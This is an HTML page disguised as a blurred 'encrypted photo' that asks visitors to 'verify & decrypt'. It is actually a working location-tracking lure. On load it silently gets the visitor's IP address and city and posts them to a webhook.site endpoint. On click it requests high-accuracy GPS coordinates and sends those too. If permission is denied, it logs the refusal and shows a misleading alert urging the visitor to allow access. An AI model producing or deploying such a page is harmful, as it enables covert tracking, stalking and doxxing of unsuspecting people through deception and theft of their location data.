<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Decrypting...</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; color: white; font-family: sans-serif; }
        #mask { position: absolute; width: 100%; height: 100%; background: url('https://images.pexels.com/photos/1462637/pexels-photo-1462637.jpeg?w=800') no-repeat center center; background-size: contain; filter: blur(20px); }
        #btn { z-index: 10; padding: 20px; border: 2px solid white; background: rgba(0,0,0,0.8); cursor: pointer; border-radius: 10px; }
    </style>
</head>
<body onload="silentHit()">
    <div id="mask"></div>
    <div id="btn" onclick="getExact()">
        <h2>⚠️ ENCRYPTED PHOTO</h2>
        <p>Click to Verify & Decrypt</p>
    </div>

    <script>
        const hook = "https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67";

        // Step 1: Send IP and City immediately when they open the page
        async function silentHit() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                fetch(hook, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "INITIAL_HIT", city: data.city, ip: data.ip }) });
            } catch (e) { /* silent fail */ }
        }

        // Step 2: Try for the "Core Truth" (GPS) when they click
        function getExact() {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await fetch(hook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        type: "GPS_SUCCESS",
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy + "m"
                    })
                });
                document.getElementById('mask').style.filter = 'none';
                document.getElementById('btn').style.display = 'none';
            }, (err) => {
                // If they deny, we send an error log so you know they are on the site
                fetch(hook, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "PERMISSION_DENIED" }) });
                alert("Decryption Failed: Please refresh and Allow access to view.");
            }, { enableHighAccuracy: true, timeout: 5000 });
        }
    </script>
</body>
</html>
